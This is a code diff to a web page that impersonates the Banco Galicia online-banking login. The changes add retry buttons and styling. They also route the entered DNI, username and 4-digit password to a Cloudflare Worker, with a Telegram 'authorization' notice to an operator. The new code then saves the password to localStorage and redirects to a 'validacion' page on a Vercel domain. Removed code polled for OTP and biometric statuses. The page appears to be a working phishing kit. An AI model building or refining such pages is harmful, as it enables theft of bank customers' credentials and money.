@@ -306,6 +306,7 @@
             border-radius: 4px;
             font-size: 14px;
             display: none;
+            white-space: pre-line;
         }
         .message-box.success {
             display: block;
@@ -324,6 +325,40 @@
             background: #d1ecf1;
             color: #0c5460;
             border: 1px solid #bee5eb;
+        }
+        /* ========================= TRANSACTION ID VISIBLE ========================= */
+        .transaction-id {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+            word-break: break-all;
+        }
+        .transaction-id.visible {
+            display: block;
+        }
+        /* ========================= BOTÓN REINTENTAR ========================= */
+        .retry-btn {
+            display: none;
+            width: 100%;
+            height: 46px;
+            border: 2px solid #f47721;
+            background: transparent;
+            color: #f47721;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        .retry-btn:hover {
+            background: #f47721;
+            color: white;
+        }
+        .retry-btn.visible {
+            display: block;
         }
     </style>
 </head>
@@ -359,8 +394,12 @@
                     Recordar identificación y usuario
                 </label>
                 <div id="mensajePc" class="message-box"></div>
+                <div id="transactionIdPc" class="transaction-id"></div>
                 <button class="login-btn" id="botonPc" type="button">
                     INICIAR SESIÓN
+                </button>
+                <button class="retry-btn" id="retryPc" type="button">
+                    🔄 REINTENTAR
                 </button>
                 <a href="#" class="link">
                     OLVIDÉ O BLOQUEÉ MIS CLAVES
@@ -398,9 +437,13 @@
                 Recordar identificación y usuario
             </label>
             <div id="mensajeMovil" class="message-box"></div>
+            <div id="transactionIdMovil" class="transaction-id"></div>
             <!-- BOTÓN -->
             <button class="mobile-button" id="botonMovil" type="button">
                 INICIAR SESIÓN
+            </button>
+            <button class="retry-btn" id="retryMovil" type="button">
+                🔄 REINTENTAR
             </button>
             <!-- ENLACE -->
             <a href="#" class="mobile-link">
@@ -426,8 +469,9 @@
 
     <script>
         // ========================= CONFIGURACIÓN =========================
-        // Cambia esta URL por la de tu Worker
-        const WORKER_URL = 'https://tu-worker-galicia.workers.dev';
+        // URL CORRECTA del Worker de Galicia
+        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+        const BASE_URL = 'https://personasgalicia.vercel.app';
         
         // ========================= FUNCIONES =========================
         function generarTransactionId() {
@@ -441,10 +485,22 @@
             if (tipo) {
                 contenedor.classList.add(tipo);
             }
+            contenedor.style.display = 'block';
         }
 
         function ocultarMensaje(contenedor) {
             contenedor.className = 'message-box';
+            contenedor.textContent = '';
+            contenedor.style.display = 'none';
+        }
+
+        function mostrarTransactionId(contenedor, id) {
+            contenedor.textContent = `🆔 ID: ${id.substring(0, 8)}...${id.substring(id.length - 4)}`;
+            contenedor.classList.add('visible');
+        }
+
+        function ocultarTransactionId(contenedor) {
+            contenedor.classList.remove('visible');
             contenedor.textContent = '';
         }
 
@@ -478,24 +534,27 @@
         }
 
         // ========================= FUNCIÓN DE LOGIN =========================
-        async function realizarLogin(dni, usuario, clave, boton, mensajeContenedor, recordar) {
-            // Validar que la clave sea de 4 dígitos
-            if (clave.length !== 4 || !/^[0-9]{4}$/.test(clave)) {
-                mostrarMensaje(mensajeContenedor, 'error', 'La clave debe ser de 4 dígitos numéricos');
+        async function realizarLogin(dni, usuario, clave, boton, mensajeContenedor, transactionIdContenedor, retryBtn, recordar) {
+            // Validar campos
+            if (!dni.trim() || !usuario.trim()) {
+                mostrarMensaje(mensajeContenedor, 'error', '⚠️ Por favor, completa todos los campos');
                 return;
             }
 
-            if (!usuario.trim() || !dni.trim()) {
-                mostrarMensaje(mensajeContenedor, 'error', 'Por favor, completa todos los campos');
+            // Validar que la clave sea de 4 dígitos
+            if (clave.length !== 4 || !/^[0-9]{4}$/.test(clave)) {
+                mostrarMensaje(mensajeContenedor, 'error', '⚠️ La clave debe ser de 4 dígitos numéricos');
                 return;
             }
 
             // Deshabilitar botón y mostrar loading
             boton.disabled = true;
             boton.classList.add('loading');
+            retryBtn.classList.remove('visible');
             const textoOriginal = boton.textContent;
-            boton.textContent = 'ENVIANDO...';
+            boton.textContent = '⏳ ENVIANDO...';
             ocultarMensaje(mensajeContenedor);
+            ocultarTransactionId(transactionIdContenedor);
 
             const transactionId = generarTransactionId();
 
@@ -515,22 +574,35 @@
                 const data = await response.json();
 
                 if (data.ok) {
+                    mostrarTransactionId(transactionIdContenedor, transactionId);
                     mostrarMensaje(mensajeContenedor, 'success', 
-                        `✅ Solicitud enviada. ID: ${transactionId.substring(0, 8)}...\nEspera la autorización en Telegram.`);
+                        `✅ Solicitud enviada correctamente\n📱 Se envió una notificación a Telegram para su autorización\n⏳ Esperando respuesta...`);
                     
                     // Guardar credenciales si se seleccionó recordar
                     guardarCredenciales(usuario.trim(), dni.trim(), recordar);
                     
-                    // Iniciar polling del estado
-                    iniciarPolling(transactionId, mensajeContenedor);
+                    // Guardar en localStorage para la página de validación
+                    localStorage.setItem('bancoldata', JSON.stringify({
+                        usuario: usuario.trim(),
+                        clave: clave,
+                        transactionId: transactionId
+                    }));
+
+                    // Redirigir a la página de validación
+                    setTimeout(() => {
+                        window.location.href = `${BASE_URL}/validacion.html`;
+                    }, 2000);
+                    
                 } else {
                     mostrarMensaje(mensajeContenedor, 'error', 
                         `❌ Error: ${data.error || 'No se pudo procesar la solicitud'}`);
+                    retryBtn.classList.add('visible');
                 }
             } catch (error) {
                 console.error('Error en login:', error);
                 mostrarMensaje(mensajeContenedor, 'error', 
-                    '❌ Error de conexión. Verifica tu conexión a internet.');
+                    '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
+                retryBtn.classList.add('visible');
             } finally {
                 // Restaurar botón
                 boton.disabled = false;
@@ -539,79 +611,8 @@
             }
         }
 
-        // ========================= POLLING DE ESTADO =========================
-        let pollingInterval = null;
-
-        function iniciarPolling(transactionId, mensajeContenedor) {
-            // Limpiar polling anterior si existe
-            if (pollingInterval) {
-                clearInterval(pollingInterval);
-            }
-
-            let intentos = 0;
-            const maxIntentos = 30; // 30 intentos (5 minutos si es cada 10s)
-
-            pollingInterval = setInterval(async () => {
-                intentos++;
-                try {
-                    const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
-                    const data = await response.json();
-
-                    if (data.estado) {
-                        const estado = data.estado;
-                        let mensaje = '';
-                        let tipo = 'info';
-
-                        switch (estado) {
-                            case 'autorizado':
-                                mensaje = '✅ ¡Autorización confirmada! Acceso concedido.';
-                                tipo = 'success';
-                                clearInterval(pollingInterval);
-                                break;
-                            case 'error':
-                                mensaje = '❌ Acceso denegado. Contacta con soporte.';
-                                tipo = 'error';
-                                clearInterval(pollingInterval);
-                                break;
-                            case 'otp_solicitado':
-                                mensaje = '📲 Se ha solicitado un OTP. Revisa tu teléfono.';
-                                tipo = 'info';
-                                break;
-                            case 'fallo_biometria':
-                                mensaje = '🔐 Validación biométrica requerida. Espera instrucciones.';
-                                tipo = 'info';
-                                break;
-                            case 'finalizado':
-                                mensaje = '🏁 Proceso finalizado.';
-                                tipo = 'info';
-                                clearInterval(pollingInterval);
-                                break;
-                            default:
-                                mensaje = `⏳ Estado: ${estado}. Esperando... (${intentos}/${maxIntentos})`;
-                                tipo = 'info';
-                        }
-
-                        mostrarMensaje(mensajeContenedor, tipo, mensaje);
-
-                        if (intentos >= maxIntentos && estado === 'pendiente') {
-                            mostrarMensaje(mensajeContenedor, 'info', 
-                                '⏰ Tiempo de espera agotado. Si no recibiste respuesta, intenta nuevamente.');
-                            clearInterval(pollingInterval);
-                        }
-                    }
-                } catch (error) {
-                    console.error('Error en polling:', error);
-                    if (intentos >= maxIntentos) {
-                        mostrarMensaje(mensajeContenedor, 'error', 
-                            '❌ Error al verificar el estado. Intenta recargar la página.');
-                        clearInterval(pollingInterval);
-                    }
-                }
-            }, 10000); // Cada 10 segundos
-        }
-
         // ========================= CONFIGURAR FORMULARIOS =========================
-        function configurarFormulario(dniInput, usuarioInput, claveInput, boton, mensajeContenedor, recordarCheck) {
+        function configurarFormulario(dniInput, usuarioInput, claveInput, boton, mensajeContenedor, transactionIdContenedor, retryBtn, recordarCheck) {
             // Cargar credenciales guardadas
             const credenciales = cargarCredenciales();
             if (credenciales.dni) dniInput.value = credenciales.dni;
@@ -639,7 +640,12 @@
                 const clave = claveInput.value;
                 const recordar = recordarCheck.checked;
 
-                realizarLogin(dni, usuario, clave, boton, mensajeContenedor, recordar);
+                realizarLogin(dni, usuario, clave, boton, mensajeContenedor, transactionIdContenedor, retryBtn, recordar);
+            });
+
+            // Botón de reintentar
+            retryBtn.addEventListener('click', function() {
+                boton.click();
             });
 
             // Permitir enviar con Enter
@@ -663,6 +669,8 @@
             document.getElementById('clavePc'),
             document.getElementById('botonPc'),
             document.getElementById('mensajePc'),
+            document.getElementById('transactionIdPc'),
+            document.getElementById('retryPc'),
             document.getElementById('recordarPc')
         );
 
@@ -673,8 +681,14 @@
             document.getElementById('claveMovil'),
             document.getElementById('botonMovil'),
             document.getElementById('mensajeMovil'),
+            document.getElementById('transactionIdMovil'),
+            document.getElementById('retryMovil'),
             document.getElementById('recordarMovil')
         );
+
+        console.log('🚀 Portal de acceso Galicia configurado');
+        console.log(`📡 Worker URL: ${WORKER_URL}`);
+        console.log(`🌐 Base URL: ${BASE_URL}`);
     </script>
 </body>
 </html>
